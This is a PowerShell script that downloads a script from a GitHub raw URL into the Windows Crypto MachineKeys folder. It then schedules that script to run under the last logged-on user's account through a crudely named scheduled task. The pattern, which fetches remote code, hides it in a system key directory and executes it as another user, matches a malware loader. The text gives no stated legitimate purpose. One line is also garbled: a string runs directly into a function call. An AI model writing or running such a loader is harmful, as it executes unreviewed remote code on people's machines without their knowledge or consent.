function Schedule-PowerShellScript {
    param(
        [string]$ScriptPath,
        [string]$UserName,
        [string]$TaskName
    )

    try {
        # Calculate the trigger time (10 seconds from now)
        $triggerTime = (Get-Date).AddSeconds(10)

        # Create a trigger for the scheduled task
        $trigger = New-ScheduledTaskTrigger -At $triggerTime -Once

        # Define the action to run PowerShell and execute the script
        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-File `"$ScriptPath`""

        # Specify the user context under which the task should run
        $principal = New-ScheduledTaskPrincipal -UserId $UserName -LogonType Interactive

        # Register the scheduled task
        $task = Register-ScheduledTask -TaskName $TaskName -Trigger $trigger -Action $action -Principal $principal -Force
        Write-Output "Task '$TaskName' scheduled to run at: $triggerTime"
    } catch {
        Write-Error "Failed to schedule task: $_"
    }
}


# Function to check if the task exists and call the scheduling function if it does not
function CheckAndScheduleTask {
    param(
        [string]$ScriptPath,
        [string]$UserName,
        [string]$TaskName
    )

    # Check if the scheduled task already exists
    $existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if (-not $existingTask) {
        Write-Output "No existing task found with the name '$TaskName'. Proceeding to schedule new task."
        Schedule-PowerShellScript -ScriptPath $ScriptPath -UserName $UserName -TaskName $TaskName
        exit
    } else {
        Write-Output "A task with the name '$TaskName' already exists. No action taken."
    }
}

Invoke-WebRequest -Uri https://raw.githubusercontent.com/user10327/zebrah/main/v2.ps1 -OutFile C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys\prompt.ps1


$lastLoggedOnUserInfo = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI").LastLoggedOnUser
$lastUser = $lastLoggedOnUserInfo.Split('\')[-1]

try
{
    Write-Output "Last logged-on user: $lastUser"CheckAndScheduleTask -ScriptPath "C:\ProgramData\Microsoft\Crypto\DSS\MachineKeys\prompt.ps1" -UserName $lastUser -TaskName "automated-ballsack-licker"

}
catch
{
    Write-Error "checkandscheduletask failed: $_"
}